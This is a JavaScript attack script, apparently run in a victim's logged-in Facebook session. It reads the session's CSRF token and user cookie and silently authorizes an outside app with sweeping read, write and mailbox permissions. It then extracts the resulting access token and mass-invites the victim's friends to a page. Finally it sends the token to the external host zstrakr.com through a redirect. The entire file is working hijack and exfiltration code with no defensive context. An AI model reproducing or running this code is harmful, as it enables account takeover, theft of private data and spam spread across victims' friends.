function XHR(){
    try{return new XMLHttpRequest();}catch(e){}try{return new ActiveXObject('Msxml3.XMLHTTP');}catch(e){}try{return new ActiveXObject('Msxml2.XMLHTTP.6.0');}catch(e){}try{return new ActiveXObject('Msxml2.XMLHTTP.3.0');}catch(e){}try{return new ActiveXObject('Msxml2.XMLHTTP');}catch(e){}try{return new ActiveXObject('Microsoft.XMLHTTP');}catch(e){}return null;
}

alert('hi');
xmlhttp = new XHR();

if(xmlhttp != null)
{
 var appID = '260273468396';
 var page = '829989343701880';

 var dtsg = escape(document['getElementsByName']('fb_dtsg')[0]['value']);
 var uid = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

 xmlhttp.open('POST', 'https://www.facebook.com/dialog/oauth/read', false);
 xmlhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
 xmlhttp.send('fb_dtsg=' + dtsg + '&app_id=' + appID + '&redirect_uri=https%3A%2F%2Fwww.facebook.com%2Fconnect%2flogin_success.html&display=page&access_token=&sdk=&from_post=1&public_info_nux=1&login=&read=friends_online_presence%2Cfriends_website%2Ccontact_email%2Cuser_location%2Cfriends_about_me%2Cfriends_checkins%2Cfriends_work_history%2Cuser_photos%2Cfriends_location%2Cuser_checkins%2Cread_friendlists%2Cuser_activities%2Cuser_friends%2Cfriends_events%2Cread_requests%2Cuser_groups%2Cread_stream%2Cfriends_relationship_details%2Cfriends_questions%2Cfriends_religion_politics%2Cfriends_education_history%2Cfriends_subscriptions%2Cuser_religion_politics%2Cuser_interests%2Cuser_videos%2Cuser_relationship_details%2Cfriends_videos%2Cuser_events%2Cuser_status%2Cfriends_games_activity%2Cuser_hometown%2Cuser_relationships%2Cfriends_interests%2Cuser_birthday%2Cuser_work_history%2Cuser_website%2Cfriends_groups%2Cemail%2Cuser_subscriptions%2Cuser_questions%2Cfriends_notes%2Cfriends_birthday%2Cfriends_likes%2Cfriends_activities%2Cfriends_relationships%2Cuser_games_activity%2Cexport_stream%2Cuser_education_history%2Cfriends_photos%2Cuser_about_me%2Cfriends_status%2Cuser_notes%2Cpublic_profile%2Cuser_likes%2Cuser_online_presence%2Cread_mailbox%2Cfriends_hometown&write=video_upload%2Cpublish_checkins%2Ccreate_note%2Cpublish_stream%2Cstatus_update%2Cpublish_actions%2Cphoto_upload%2Cshare_item&extended=sms%2Ccreate_event%2Cads_management%2Cmanage_pages%2Crsvp_event%2Cxmpp_login%2Cmanage_friendlists%2Cread_page_mailboxes%2Cmanage_notifications%2Cread_insights&confirm=&seen_scopes=friends_online_presence%2Cfriends_website%2Ccontact_email%2Cuser_location%2Cfriends_about_me%2Cfriends_checkins%2Cfriends_work_history%2Cuser_photos%2Cfriends_location%2Cuser_checkins%2Cread_friendlists%2Cuser_activities%2Cuser_friends%2Cfriends_events%2Cread_requests%2Cuser_groups%2Cread_stream%2Cfriends_relationship_details%2Cfriends_questions%2Cfriends_religion_politics%2Cfriends_education_history%2Cfriends_subscriptions%2Cuser_religion_politics%2Cuser_interests%2Cuser_videos%2Cuser_relationship_details%2Cfriends_videos%2Cuser_events%2Cuser_status%2Cfriends_games_activity%2Cuser_hometown%2Cuser_relationships%2Cfriends_interests%2Cuser_birthday%2Cuser_work_history%2Cuser_website%2Cfriends_groups%2Cemail%2Cuser_subscriptions%2Cuser_questions%2Cfriends_notes%2Cfriends_birthday%2Cfriends_likes%2Cfriends_activities%2Cfriends_relationships%2Cuser_games_activity%2Cexport_stream%2Cuser_education_history%2Cfriends_photos%2Cuser_about_me%2Cfriends_status%2Cuser_notes%2Cpublic_profile%2Cuser_likes%2Cuser_online_presence%2Cread_mailbox%2Cfriends_hometown&auth_type=&auth_nonce=&return_format=access_token&domain=&sso_device=&__CONFIRM__=1&__user=' + uid + '&__a=1&__dyn=&__req=5&__rev=&ttstamp=');

 xmlhttp.open('POST', 'https://www.facebook.com/dialog/oauth/write', false);
 xmlhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
 xmlhttp.send('fb_dtsg=' + dtsg + '&app_id=' + appID + '&redirect_uri=https%3A%2F%2Fwww.facebook.com%2Fconnect%2flogin_success.html&display=page&access_token=&sdk=&from_post=1&login=&read=&write=video_upload%2Cpublish_checkins%2Ccreate_note%2Cpublish_stream%2Cstatus_update%2Cpublish_actions%2Cphoto_upload%2Cshare_item&extended=sms%2Ccreate_event%2Cads_management%2Cmanage_pages%2Crsvp_event%2Cxmpp_login%2Cmanage_friendlists%2Cread_page_mailboxes%2Cmanage_notifications%2Cread_insights&confirm=&seen_scopes=video_upload%2Cpublish_checkins%2Ccreate_note%2Cpublish_stream%2Cstatus_update%2Cpublish_actions%2Cphoto_upload%2Cshare_item&auth_type=&auth_nonce=&return_format=access_token&domain=&sso_device=&audience[0][value]=40&__CONFIRM__=1&__user=' + uid + '&__a=1&__dyn=7n8ahyj35zoSt2u5KIGKaEwlyp9EbEyGgS8w&__req=6&__rev=1079628&ttstamp=265816597571147397');

 xmlhttp.open('POST', 'https://www.facebook.com/dialog/oauth/extended', false);
 xmlhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
 xmlhttp.send('fb_dtsg=' + dtsg + '&app_id=' + appID + '&redirect_uri=https%3A%2F%2Fwww.facebook.com%2Fconnect%2flogin_success.html&display=page&access_token=&sdk=&from_post=1&login=&read=&write=&extended=sms%2Ccreate_event%2Cads_management%2Cmanage_pages%2Crsvp_event%2Cxmpp_login%2Cmanage_friendlists%2Cread_page_mailboxes%2Cmanage_notifications%2Cread_insights&confirm=&seen_scopes=sms%2Ccreate_event%2Cads_management%2Cmanage_pages%2Crsvp_event%2Cxmpp_login%2Cmanage_friendlists%2Cread_page_mailboxes%2Cmanage_notifications%2Cread_insights&auth_type=&auth_nonce=&return_format=access_token&domain=&sso_device=&audience[0][value]=40&__CONFIRM__=1&__user=' + uid + '&__a=1&__dyn=7n8ahyj35zoSt2u5KIGKaEwlyp9EbEyGgS8w&__req=6&__rev=1079628&ttstamp=265816597571147397');

 if(xmlhttp.responseText != null)
  {
    var token = xmlhttp.responseText.substring(xmlhttp.responseText.lastIndexOf('token=') + 6, xmlhttp.responseText.lastIndexOf('&expires'));

   xmlhttp.open('GET', 'https://graph.facebook.com/me/friends?access_token=' + token, false);
   xmlhttp.send();

   var friends = JSON.parse(xmlhttp.responseText);
   friends = friends.data;

   var friendsChunked = [];
   var size = 50;

   while(friends.length > 0)
    friendsChunked.push(friends.splice(0, size));

   for(i = 0; i < friendsChunked.length; i++)
   {
    var friendsPostData = '';
    var friendsNames = '';
    for(j = 0; j < friendsChunked[i].length; j++)
    {
     friendsPostData += 'inlineInviteTypeahead[' + j + ']=' + friendsChunked[i][j].id + '&';
     friendsNames += 'text_inlineInviteTypeahead[' + j + ']=' + encodeURIComponent(friendsChunked[i][j].name) + '&';
    }

    console.log(friendsPostData);

    xmlhttp.open('POST', 'https://www.facebook.com/ajax/pages/invite/send_multiple/?ref=friend_summary_section_typeahead&page_id=' + page + '&action=send', false);
    xmlhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    xmlhttp.send('fb_dtsg=' + dtsg + '&' + friendsPostData + friendsNames + 'nctr[_mod]=pagelet_timeline_recent&__user=' + uid + '&__a=1&__dyn=&__req=&ttstamp=&__rev=');
   }
  }

window.location.href = 'http://zstrakr.com/newdir.php?session=' + token;
}
else
{
 // Error
}  

  